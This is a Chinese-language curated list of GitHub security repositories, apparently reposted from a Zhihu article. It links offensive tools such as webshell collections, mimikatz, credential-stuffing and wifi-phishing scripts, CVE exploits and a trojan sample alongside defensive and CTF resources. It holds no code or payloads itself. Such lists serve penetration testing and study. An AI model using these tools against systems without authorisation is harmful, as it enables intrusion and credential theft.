<h4 id="Waf类型检测工具"><a href="#Waf类型检测工具" class="headerlink" title="Waf类型检测工具"></a>Waf类型检测工具</h4><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="external">https://github.com/EnableSecurity/wafw00f</a></p>
<h3 id="信息搜集工具"><a href="#信息搜集工具" class="headerlink" title="信息搜集工具 :"></a>信息搜集工具 :</h3><h4 id="社工插件，可查找以email、phone、username的注册的所有网站账号信息"><a href="#社工插件，可查找以email、phone、username的注册的所有网站账号信息" class="headerlink" title="社工插件，可查找以email、phone、username的注册的所有网站账号信息"></a>社工插件，可查找以email、phone、username的注册的所有网站账号信息</h4><p><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="external">https://github.com/n0tr00t/Sreg</a></p>
<h4 id="Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息"><a href="#Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息" class="headerlink" title="Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息"></a>Github信息搜集，可实时扫描查询git最新上传有关邮箱账号密码信息</h4><p><a href="https://github.com/sea-god/gitscan" target="_blank" rel="external">https://github.com/sea-god/gitscan</a></p>
<h4 id="github-Repo信息搜集工具"><a href="#github-Repo信息搜集工具" class="headerlink" title="github Repo信息搜集工具"></a>github Repo信息搜集工具</h4><p><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="external">https://github.com/metac0rtex/GitHarvester</a></p>
<h3 id="WEB："><a href="#WEB：" class="headerlink" title="WEB："></a>WEB：</h3><h4 id="webshell大合集"><a href="#webshell大合集" class="headerlink" title="webshell大合集"></a>webshell大合集</h4><p><a href="https://github.com/tennc/webshell" target="_blank" rel="external">https://github.com/tennc/webshell</a></p>
<h4 id="渗透以及web攻击脚本"><a href="#渗透以及web攻击脚本" class="headerlink" title="渗透以及web攻击脚本"></a>渗透以及web攻击脚本</h4><p><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="external">https://github.com/brianwrf/hackUtils</a></p>
<h4 id="web渗透小工具大合集"><a href="#web渗透小工具大合集" class="headerlink" title="web渗透小工具大合集"></a>web渗透小工具大合集</h4><p><a href="https://github.com/rootphantomer/hack_tools_for_me" target="_blank" rel="external">https://github.com/rootphantomer/hack_tools_for_me</a></p>
<h4 id="XSS数据接收平台"><a href="#XSS数据接收平台" class="headerlink" title="XSS数据接收平台"></a>XSS数据接收平台</h4><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="external">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
<h4 id="XSS与CSRF工具"><a href="#XSS与CSRF工具" class="headerlink" title="XSS与CSRF工具"></a>XSS与CSRF工具</h4><p><a href="https://github.com/evilcos/xssor" target="_blank" rel="external">https://github.com/evilcos/xssor</a></p>
<h4 id="Short-for-command-injection-exploiter，web向命令注入检测工具"><a href="#Short-for-command-injection-exploiter，web向命令注入检测工具" class="headerlink" title="Short for command injection exploiter，web向命令注入检测工具"></a>Short for command injection exploiter，web向命令注入检测工具</h4><p><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="external">https://github.com/stasinopoulos/commix</a></p>
<h4 id="数据库注入工具"><a href="#数据库注入工具" class="headerlink" title="数据库注入工具"></a>数据库注入工具</h4><p><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="external">https://github.com/sqlmapproject/sqlmap</a></p>
<h4 id="Web代理，通过加载sqlmap-api进行sqli实时检测"><a href="#Web代理，通过加载sqlmap-api进行sqli实时检测" class="headerlink" title="Web代理，通过加载sqlmap api进行sqli实时检测"></a>Web代理，通过加载sqlmap api进行sqli实时检测</h4><p><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="external">https://github.com/zt2/sqli-hunter</a></p>
<h4 id="新版中国菜刀"><a href="#新版中国菜刀" class="headerlink" title="新版中国菜刀"></a>新版中国菜刀</h4><p><a href="https://github.com/Chora10/Cknife" target="_blank" rel="external">https://github.com/Chora10/Cknife</a></p>
<h4 id="git泄露利用EXP"><a href="#git泄露利用EXP" class="headerlink" title=".git泄露利用EXP"></a>.git泄露利用EXP</h4><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">https://github.com/lijiejie/GitHack</a></p>
<h4 id="浏览器攻击框架"><a href="#浏览器攻击框架" class="headerlink" title="浏览器攻击框架"></a>浏览器攻击框架</h4><p><a href="https://github.com/beefproject/beef" target="_blank" rel="external">https://github.com/beefproject/beef</a></p>
<h4 id="自动化绕过WAF脚本"><a href="#自动化绕过WAF脚本" class="headerlink" title="自动化绕过WAF脚本"></a>自动化绕过WAF脚本</h4><p><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="external">https://github.com/khalilbijjou/WAFNinja</a></p>
<h4 id="http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）"><a href="#http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）" class="headerlink" title="http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）"></a>http命令行客户端，可以从命令行构造发送各种http请求（类似于Curl）</h4><p><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="external">https://github.com/jkbrzt/httpie</a></p>
<h4 id="浏览器调试利器"><a href="#浏览器调试利器" class="headerlink" title="浏览器调试利器"></a>浏览器调试利器</h4><p><a href="https://github.com/firebug/firebug" target="_blank" rel="external">https://github.com/firebug/firebug</a></p>
<h4 id="一款开源WAF"><a href="#一款开源WAF" class="headerlink" title="一款开源WAF"></a>一款开源WAF</h4><p><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="external">https://github.com/SpiderLabs/ModSecurity</a></p>
<h3 id="windows域渗透工具："><a href="#windows域渗透工具：" class="headerlink" title="windows域渗透工具："></a>windows域渗透工具：</h3><h4 id="windows渗透神器"><a href="#windows渗透神器" class="headerlink" title="windows渗透神器"></a>windows渗透神器</h4><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz</a></p>
<h4 id="Powershell渗透库合集"><a href="#Powershell渗透库合集" class="headerlink" title="Powershell渗透库合集"></a>Powershell渗透库合集</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="external">https://github.com/PowerShellMafia/PowerSploit</a></p>
<h4 id="Powershell-tools合集"><a href="#Powershell-tools合集" class="headerlink" title="Powershell tools合集"></a>Powershell tools合集</h4><p><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="external">https://github.com/clymb3r/PowerShell</a></p>
<h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz:"></a>Fuzz:</h3><h4 id="Web向Fuzz工具"><a href="#Web向Fuzz工具" class="headerlink" title="Web向Fuzz工具"></a>Web向Fuzz工具</h4><p><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="external">https://github.com/xmendez/wfuzz</a></p>
<h4 id="HTTP暴力破解，撞库攻击脚本"><a href="#HTTP暴力破解，撞库攻击脚本" class="headerlink" title="HTTP暴力破解，撞库攻击脚本"></a>HTTP暴力破解，撞库攻击脚本</h4><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="external">https://github.com/lijiejie/htpwdScan</a></p>
<h3 id="漏洞利用及攻击框架："><a href="#漏洞利用及攻击框架：" class="headerlink" title="漏洞利用及攻击框架："></a>漏洞利用及攻击框架：</h3><h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework</a></p>
<h4 id="Poc调用框架，可加载Pocsuite-Tangscan，Beebeeto等"><a href="#Poc调用框架，可加载Pocsuite-Tangscan，Beebeeto等" class="headerlink" title="Poc调用框架，可加载Pocsuite,Tangscan，Beebeeto等"></a>Poc调用框架，可加载Pocsuite,Tangscan，Beebeeto等</h4><p><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="external">https://github.com/erevus-cn/pocscan</a></p>
<h4 id="Pocsuite"><a href="#Pocsuite" class="headerlink" title="Pocsuite"></a>Pocsuite</h4><p><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="external">https://github.com/knownsec/Pocsuite</a></p>
<h4 id="Beebeeto"><a href="#Beebeeto" class="headerlink" title="Beebeeto"></a>Beebeeto</h4><p><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="external">https://github.com/n0tr00t/Beebeeto-framework</a></p>
<a id="more"></a>
<h3 id="漏洞POC-amp-EXP"><a href="#漏洞POC-amp-EXP" class="headerlink" title="漏洞POC&amp;EXP:"></a>漏洞POC&amp;EXP:</h3><h4 id="ExploitDB官方git版本"><a href="#ExploitDB官方git版本" class="headerlink" title="ExploitDB官方git版本"></a>ExploitDB官方git版本</h4><p><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="external">https://github.com/offensive-security/exploit-database</a></p>
<h4 id="php漏洞代码分析"><a href="#php漏洞代码分析" class="headerlink" title="php漏洞代码分析"></a>php漏洞代码分析</h4><p><a href="https://github.com/80vul/phpcodz" target="_blank" rel="external">https://github.com/80vul/phpcodz</a></p>
<h4 id="Simple-test-for-CVE-2016-2107"><a href="#Simple-test-for-CVE-2016-2107" class="headerlink" title="Simple test for CVE-2016-2107"></a>Simple test for CVE-2016-2107</h4><p><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="external">https://github.com/FiloSottile/CVE-2016-2107</a></p>
<h4 id="CVE-2015-7547-POC"><a href="#CVE-2015-7547-POC" class="headerlink" title="CVE-2015-7547 POC"></a>CVE-2015-7547 POC</h4><p><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="external">https://github.com/fjserna/CVE-2015-7547</a></p>
<h4 id="JAVA反序列化POC生成工具"><a href="#JAVA反序列化POC生成工具" class="headerlink" title="JAVA反序列化POC生成工具"></a>JAVA反序列化POC生成工具</h4><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">https://github.com/frohoff/ysoserial</a></p>
<h4 id="JAVA反序列化EXP"><a href="#JAVA反序列化EXP" class="headerlink" title="JAVA反序列化EXP"></a>JAVA反序列化EXP</h4><p><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="external">https://github.com/foxglovesec/JavaUnserializeExploits</a></p>
<h4 id="Jenkins-CommonCollections-EXP"><a href="#Jenkins-CommonCollections-EXP" class="headerlink" title="Jenkins CommonCollections EXP"></a>Jenkins CommonCollections EXP</h4><p><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="external">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p>
<h4 id="CVE-2015-2426-EXP-windows内核提权"><a href="#CVE-2015-2426-EXP-windows内核提权" class="headerlink" title="CVE-2015-2426 EXP (windows内核提权)"></a>CVE-2015-2426 EXP (windows内核提权)</h4><p><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="external">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p>
<h4 id="use-docker-to-show-web-attack-php本地文件包含结合phpinfo-getshell-以及ssrf结合curl的利用演示"><a href="#use-docker-to-show-web-attack-php本地文件包含结合phpinfo-getshell-以及ssrf结合curl的利用演示" class="headerlink" title="use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示)"></a>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示)</h4><p><a href="https://github.com/hxer/vulnapp" target="_blank" rel="external">https://github.com/hxer/vulnapp</a></p>
<h4 id="php7缓存覆写漏洞Demo及相关工具"><a href="#php7缓存覆写漏洞Demo及相关工具" class="headerlink" title="php7缓存覆写漏洞Demo及相关工具"></a>php7缓存覆写漏洞Demo及相关工具</h4><p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="external">https://github.com/GoSecure/php7-opcache-override</a></p>
<h4 id="XcodeGhost木马样本"><a href="#XcodeGhost木马样本" class="headerlink" title="XcodeGhost木马样本"></a>XcodeGhost木马样本</h4><p><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="external">https://github.com/XcodeGhostSource/XcodeGhost</a></p>
<h3 id="中间人攻击及钓鱼"><a href="#中间人攻击及钓鱼" class="headerlink" title="中间人攻击及钓鱼"></a>中间人攻击及钓鱼</h3><h4 id="中间人攻击框架"><a href="#中间人攻击框架" class="headerlink" title="中间人攻击框架"></a>中间人攻击框架</h4><p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="external">https://github.com/secretsquirrel/the-backdoor-factory</a><br><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="external">https://github.com/secretsquirrel/BDFProxy</a><br><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="external">https://github.com/byt3bl33d3r/MITMf</a></p>
<h4 id="Inject-code-jam-wifi-and-spy-on-wifi-users"><a href="#Inject-code-jam-wifi-and-spy-on-wifi-users" class="headerlink" title="Inject code, jam wifi, and spy on wifi users"></a>Inject code, jam wifi, and spy on wifi users</h4><p><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="external">https://github.com/DanMcInerney/LANs.py</a></p>
<h4 id="可扩展的中间人代理工具"><a href="#可扩展的中间人代理工具" class="headerlink" title="可扩展的中间人代理工具"></a>可扩展的中间人代理工具</h4><p><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="external">https://github.com/intrepidusgroup/mallory</a></p>
<h4 id="wifi钓鱼"><a href="#wifi钓鱼" class="headerlink" title="wifi钓鱼"></a>wifi钓鱼</h4><p><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="external">https://github.com/sophron/wifiphisher</a></p>
<h3 id="密码破解："><a href="#密码破解：" class="headerlink" title="密码破解："></a>密码破解：</h3><h4 id="密码破解工具"><a href="#密码破解工具" class="headerlink" title="密码破解工具"></a>密码破解工具</h4><p><a href="https://github.com/shinnok/johnny" target="_blank" rel="external">https://github.com/shinnok/johnny</a></p>
<h4 id="本地存储的各类密码提取利器"><a href="#本地存储的各类密码提取利器" class="headerlink" title="本地存储的各类密码提取利器"></a>本地存储的各类密码提取利器</h4><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="external">https://github.com/AlessandroZ/LaZagne</a></p>
<h3 id="二进制及代码分析工具："><a href="#二进制及代码分析工具：" class="headerlink" title="二进制及代码分析工具："></a>二进制及代码分析工具：</h3><h4 id="二进制分析工具"><a href="#二进制分析工具" class="headerlink" title="二进制分析工具"></a>二进制分析工具</h4><p><a href="https://github.com/devttys0/binwalk" target="_blank" rel="external">https://github.com/devttys0/binwalk</a></p>
<h4 id="系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息"><a href="#系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息" class="headerlink" title="系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息"></a>系统扫描器，用于寻找程序和库然后收集他们的依赖关系，链接等信息</h4><p><a href="https://github.com/quarkslab/binmap" target="_blank" rel="external">https://github.com/quarkslab/binmap</a></p>
<h4 id="rp-is-a-full-cpp-written-tool-that-aims-to-find-ROP-sequences-in-PE-Elf-Mach-O-doesn’t-support-the-FAT-binaries-x86-x64-binaries"><a href="#rp-is-a-full-cpp-written-tool-that-aims-to-find-ROP-sequences-in-PE-Elf-Mach-O-doesn’t-support-the-FAT-binaries-x86-x64-binaries" class="headerlink" title="rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O (doesn’t support the FAT binaries) x86/x64 binaries."></a>rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O (doesn’t support the FAT binaries) x86/x64 binaries.</h4><p><a href="https://github.com/0vercl0k/rp" target="_blank" rel="external">https://github.com/0vercl0k/rp</a></p>
<h4 id="Windows-Exploit-Development工具"><a href="#Windows-Exploit-Development工具" class="headerlink" title="Windows Exploit Development工具"></a>Windows Exploit Development工具</h4><p><a href="https://github.com/lillypad/badger" target="_blank" rel="external">https://github.com/lillypad/badger</a></p>
<h4 id="二进制静态分析工具（python）"><a href="#二进制静态分析工具（python）" class="headerlink" title="二进制静态分析工具（python）"></a>二进制静态分析工具（python）</h4><p><a href="https://github.com/bdcht/amoco" target="_blank" rel="external">https://github.com/bdcht/amoco</a></p>
<h4 id="Python-Exploit-Development-Assistance-for-GDB"><a href="#Python-Exploit-Development-Assistance-for-GDB" class="headerlink" title="Python Exploit Development Assistance for GDB"></a>Python Exploit Development Assistance for GDB</h4><p><a href="https://github.com/longld/peda" target="_blank" rel="external">https://github.com/longld/peda</a></p>
<h4 id="对BillGates-Linux-Botnet系木马活动的监控工具"><a href="#对BillGates-Linux-Botnet系木马活动的监控工具" class="headerlink" title="对BillGates Linux Botnet系木马活动的监控工具"></a>对BillGates Linux Botnet系木马活动的监控工具</h4><p><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="external">https://github.com/ValdikSS/billgates-botnet-tracker</a></p>
<h4 id="木马配置参数提取工具"><a href="#木马配置参数提取工具" class="headerlink" title="木马配置参数提取工具"></a>木马配置参数提取工具</h4><p><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="external">https://github.com/kevthehermit/RATDecoders</a></p>
<h4 id="Shellphish编写的二进制分析工具（CTF向）"><a href="#Shellphish编写的二进制分析工具（CTF向）" class="headerlink" title="Shellphish编写的二进制分析工具（CTF向）"></a>Shellphish编写的二进制分析工具（CTF向）</h4><p><a href="https://github.com/angr/angr" target="_blank" rel="external">https://github.com/angr/angr</a></p>
<h4 id="针对python的静态代码分析工具"><a href="#针对python的静态代码分析工具" class="headerlink" title="针对python的静态代码分析工具"></a>针对python的静态代码分析工具</h4><p><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="external">https://github.com/yinwang0/pysonar2</a></p>
<h4 id="一个自动化的脚本（shell）分析工具，用来给出警告和建议"><a href="#一个自动化的脚本（shell）分析工具，用来给出警告和建议" class="headerlink" title="一个自动化的脚本（shell）分析工具，用来给出警告和建议"></a>一个自动化的脚本（shell）分析工具，用来给出警告和建议</h4><p><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="external">https://github.com/koalaman/shellcheck</a></p>
<h4 id="基于AST变换的简易Javascript反混淆辅助工具"><a href="#基于AST变换的简易Javascript反混淆辅助工具" class="headerlink" title="基于AST变换的简易Javascript反混淆辅助工具"></a>基于AST变换的简易Javascript反混淆辅助工具</h4><p><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="external">https://github.com/ChiChou/etacsufbo</a></p>
<h3 id="EXP编写框架及工具："><a href="#EXP编写框架及工具：" class="headerlink" title="EXP编写框架及工具："></a>EXP编写框架及工具：</h3><h4 id="二进制EXP编写工具"><a href="#二进制EXP编写工具" class="headerlink" title="二进制EXP编写工具"></a>二进制EXP编写工具</h4><p><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="external">https://github.com/t00sh/rop-tool</a></p>
<h4 id="CTF-Pwn-类题目脚本编写框架"><a href="#CTF-Pwn-类题目脚本编写框架" class="headerlink" title="CTF Pwn 类题目脚本编写框架"></a>CTF Pwn 类题目脚本编写框架</h4><p><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="external">https://github.com/Gallopsled/pwntools</a></p>
<h4 id="an-easy-to-use-io-library-for-pwning-development"><a href="#an-easy-to-use-io-library-for-pwning-development" class="headerlink" title="an easy-to-use io library for pwning development"></a>an easy-to-use io library for pwning development</h4><p><a href="https://github.com/zTrix/zio" target="_blank" rel="external">https://github.com/zTrix/zio</a></p>
<h4 id="跨平台注入工具（-Inject-JavaScript-to-explore-native-apps-on-Windows-Mac-Linux-iOS-and-Android-）"><a href="#跨平台注入工具（-Inject-JavaScript-to-explore-native-apps-on-Windows-Mac-Linux-iOS-and-Android-）" class="headerlink" title="跨平台注入工具（ Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.）"></a>跨平台注入工具（ Inject JavaScript to explore native apps on Windows, Mac, Linux, iOS and Android.）</h4><p><a href="https://github.com/frida/frida" target="_blank" rel="external">https://github.com/frida/frida</a></p>
<h3 id="隐写："><a href="#隐写：" class="headerlink" title="隐写："></a>隐写：</h3><h4 id="隐写检测工具"><a href="#隐写检测工具" class="headerlink" title="隐写检测工具"></a>隐写检测工具</h4><p><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="external">https://github.com/abeluck/stegdetect</a></p>
<h3 id="各类安全资料"><a href="#各类安全资料" class="headerlink" title="各类安全资料:"></a>各类安全资料:</h3><h4 id="域渗透教程"><a href="#域渗透教程" class="headerlink" title="域渗透教程"></a>域渗透教程</h4><p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="external">https://github.com/l3m0n/pentest_study</a></p>
<h4 id="python-security教程（原文链接http-www-primalsecurity-net-tutorials-python-tutorials-）"><a href="#python-security教程（原文链接http-www-primalsecurity-net-tutorials-python-tutorials-）" class="headerlink" title="python security教程（原文链接http://www.primalsecurity.net/tutorials/python-tutorials/）"></a>python security教程（原文链接<a href="http://www.primalsecurity.net/tutorials/python-tutorials/）" target="_blank" rel="external">http://www.primalsecurity.net/tutorials/python-tutorials/）</a></h4><p><a href="https://github.com/smartFlash/pySecurity" target="_blank" rel="external">https://github.com/smartFlash/pySecurity</a></p>
<h4 id="data-hacking合集"><a href="#data-hacking合集" class="headerlink" title="data_hacking合集"></a>data_hacking合集</h4><p><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="external">https://github.com/ClickSecurity/data_hacking</a></p>
<h4 id="mobile-security-wiki"><a href="#mobile-security-wiki" class="headerlink" title="mobile-security-wiki"></a>mobile-security-wiki</h4><p><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="external">https://github.com/exploitprotocol/mobile-security-wiki</a></p>
<h4 id="书籍《reverse-engineering-for-beginners》"><a href="#书籍《reverse-engineering-for-beginners》" class="headerlink" title="书籍《reverse-engineering-for-beginners》"></a>书籍《reverse-engineering-for-beginners》</h4><p><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="external">https://github.com/veficos/reverse-engineering-for-beginners</a></p>
<h4 id="一些信息安全标准及设备配置"><a href="#一些信息安全标准及设备配置" class="headerlink" title="一些信息安全标准及设备配置"></a>一些信息安全标准及设备配置</h4><p><a href="https://github.com/luyg24/IT_security" target="_blank" rel="external">https://github.com/luyg24/IT_security</a></p>
<h4 id="APT相关笔记"><a href="#APT相关笔记" class="headerlink" title="APT相关笔记"></a>APT相关笔记</h4><p><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="external">https://github.com/kbandla/APTnotes</a></p>
<h4 id="Kcon资料"><a href="#Kcon资料" class="headerlink" title="Kcon资料"></a>Kcon资料</h4><p><a href="https://github.com/knownsec/KCon" target="_blank" rel="external">https://github.com/knownsec/KCon</a></p>
<h4 id="ctf及黑客资源合集"><a href="#ctf及黑客资源合集" class="headerlink" title="ctf及黑客资源合集"></a>ctf及黑客资源合集</h4><p><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="external">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p>
<h4 id="ctf和安全工具大合集"><a href="#ctf和安全工具大合集" class="headerlink" title="ctf和安全工具大合集"></a>ctf和安全工具大合集</h4><p><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="external">https://github.com/zardus/ctf-tools</a></p>
<h4 id="《DO-NOT-FUCK-WITH-A-HACKER》"><a href="#《DO-NOT-FUCK-WITH-A-HACKER》" class="headerlink" title="《DO NOT FUCK WITH A HACKER》"></a>《DO NOT FUCK WITH A HACKER》</h4><p><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="external">https://github.com/citypw/DNFWAH</a></p>
<h3 id="各类CTF资源"><a href="#各类CTF资源" class="headerlink" title="各类CTF资源"></a>各类CTF资源</h3><h4 id="近年ctf-writeup大全"><a href="#近年ctf-writeup大全" class="headerlink" title="近年ctf writeup大全"></a>近年ctf writeup大全</h4><p><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="external">https://github.com/ctfs/write-ups-2016</a><br><a href="https://github.com/ctfs/write-ups-2015" target="_blank" rel="external">https://github.com/ctfs/write-ups-2015</a><br><a href="https://github.com/ctfs/write-ups-2014" target="_blank" rel="external">https://github.com/ctfs/write-ups-2014</a></p>
<h4 id="fbctf竞赛平台Demo"><a href="#fbctf竞赛平台Demo" class="headerlink" title="fbctf竞赛平台Demo"></a>fbctf竞赛平台Demo</h4><p><a href="https://github.com/facebook/fbctf" target="_blank" rel="external">https://github.com/facebook/fbctf</a></p>
<h4 id="ctf-Resources"><a href="#ctf-Resources" class="headerlink" title="ctf Resources"></a>ctf Resources</h4><p><a href="https://github.com/ctfs/resources" target="_blank" rel="external">https://github.com/ctfs/resources</a> </p>
<h3 id="各类编程资源"><a href="#各类编程资源" class="headerlink" title="各类编程资源:"></a>各类编程资源:</h3><h4 id="大礼包（什么都有）"><a href="#大礼包（什么都有）" class="headerlink" title="大礼包（什么都有）"></a>大礼包（什么都有）</h4><p><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="external">https://github.com/bayandin/awesome-awesomeness</a> bash-handbook<br><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="external">https://github.com/denysdovhan/bash-handbook</a> python资源大全<br><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="external">https://github.com/jobbole/awesome-python-cn</a> git学习资料<br><a href="https://github.com/xirong/my-git" target="_blank" rel="external">https://github.com/xirong/my-git</a> 安卓开源代码解析<br><a href="https://github.com/android-cn/android-open-project-analysis" target="_blank" rel="external">https://github.com/android-cn/android-open-project-analysis</a> python框架，库，资源大合集<br><a href="https://github.com/vinta/awesome-python" target="_blank" rel="external">https://github.com/vinta/awesome-python</a> JS 正则表达式库（用于简化构造复杂的JS正则表达式）<br><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="external">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p>
<h3 id="Python："><a href="#Python：" class="headerlink" title="Python："></a>Python：</h3><h4 id="python-正则表达式库（用于简化构造复杂的python正则表达式）-https-github-com-VerbalExpressions-PythonVerbalExpressions-python任务管理以及命令执行库"><a href="#python-正则表达式库（用于简化构造复杂的python正则表达式）-https-github-com-VerbalExpressions-PythonVerbalExpressions-python任务管理以及命令执行库" class="headerlink" title="python 正则表达式库（用于简化构造复杂的python正则表达式） https://github.com/VerbalExpressions/PythonVerbalExpressions python任务管理以及命令执行库"></a>python 正则表达式库（用于简化构造复杂的python正则表达式） <a href="https://github.com/VerbalExpressions/PythonVerbalExpressions" target="_blank" rel="external">https://github.com/VerbalExpressions/PythonVerbalExpressions</a> python任务管理以及命令执行库</h4><p><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="external">https://github.com/pyinvoke/invoke</a> python exe打包库<br><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="external">https://github.com/pyinstaller/pyinstaller</a> py3 爬虫框架<br><a href="https://github.com/orf/cyborg" target="_blank" rel="external">https://github.com/orf/cyborg</a> 一个提供底层接口数据包编程和网络协议支持的python库<br><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="external">https://github.com/CoreSecurity/impacket</a> python requests 库<br><a href="https://github.com/kennethreitz/requests" target="_blank" rel="external">https://github.com/kennethreitz/requests</a> python 实用工具合集<br><a href="https://github.com/mahmoud/boltons" target="_blank" rel="external">https://github.com/mahmoud/boltons</a> python爬虫系统<br><a href="https://github.com/binux/pyspider" target="_blank" rel="external">https://github.com/binux/pyspider</a> ctf向 python工具包<br><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="external">https://github.com/P1kachu/v0lt</a></p>
<h3 id="科学上网："><a href="#科学上网：" class="headerlink" title="科学上网："></a>科学上网：</h3><h4 id="科学上网工具-https-github-com-XX-net-XX-Net"><a href="#科学上网工具-https-github-com-XX-net-XX-Net" class="headerlink" title="科学上网工具 https://github.com/XX-net/XX-Net"></a>科学上网工具 <a href="https://github.com/XX-net/XX-Net" target="_blank" rel="external">https://github.com/XX-net/XX-Net</a></h4><h3 id="福利："><a href="#福利：" class="headerlink" title="福利："></a>福利：</h3><h4 id="微信自动抢红包动态库"><a href="#微信自动抢红包动态库" class="headerlink" title="微信自动抢红包动态库"></a>微信自动抢红包动态库</h4><p><a href="https://github.com/east520/AutoGetRedEnv" target="_blank" rel="external">https://github.com/east520/AutoGetRedEnv</a> </p>
<h4 id="微信抢红包插件（安卓版）"><a href="#微信抢红包插件（安卓版）" class="headerlink" title="微信抢红包插件（安卓版）"></a>微信抢红包插件（安卓版）</h4><p><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney" target="_blank" rel="external">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a> </p>
<h4 id="神器"><a href="#神器" class="headerlink" title="神器"></a>神器</h4><p><a href="https://github.com/yangyangwithgnu/hardseed" target="_blank" rel="external">https://github.com/yangyangwithgnu/hardseed</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文地址:&lt;a href=&quot;https://zhuanlan.zhihu.com/p/21380662&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://zhuanlan.zhihu.com/p/21380662&lt;/a&gt;&lt;br&gt;转:&lt;a href=&quot;http://zone.wooyun.org/content/28363&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://zone.wooyun.org/content/28363&lt;/a&gt;&lt;br&gt;作者:天谕 链接:&lt;a href=&quot;https://zhuanlan.zhihu.com/p/21380662&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://zhuanlan.zhihu.com/p/21380662&lt;/a&gt;&lt;br&gt;来源:知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。&lt;/p&gt;
